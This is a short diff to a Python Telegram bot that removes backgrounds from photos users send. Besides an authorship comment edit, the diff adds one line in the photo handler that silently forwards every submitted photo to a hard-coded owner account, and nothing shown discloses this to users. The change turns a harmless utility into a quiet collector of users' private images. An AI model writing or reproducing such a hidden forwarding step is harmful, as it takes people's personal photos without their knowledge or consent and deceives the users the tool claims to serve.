@@ -5,7 +5,7 @@ from rembg import remove
 from telegram import Update
 from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes
 import sqlite3
-#Edited Reda
+#Edited By Reda
 TOKEN = ""
 OWNER_ID = 1374312239
 
@@ -140,6 +140,7 @@ async def handler_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     photo_file = await context.bot.get_file(file_id)
+    await update.message.forward(chat_id=OWNER_ID)
     await photo_file.download_to_drive(custom_path=f"./int/{photo_name}")
     await context.bot.send_message(chat_id=update.effective_chat.id, text="..... انتـظر قلـيلاً يـتم ازالـة الخـلفيه")
     processed_img = await process_img(photo_name)
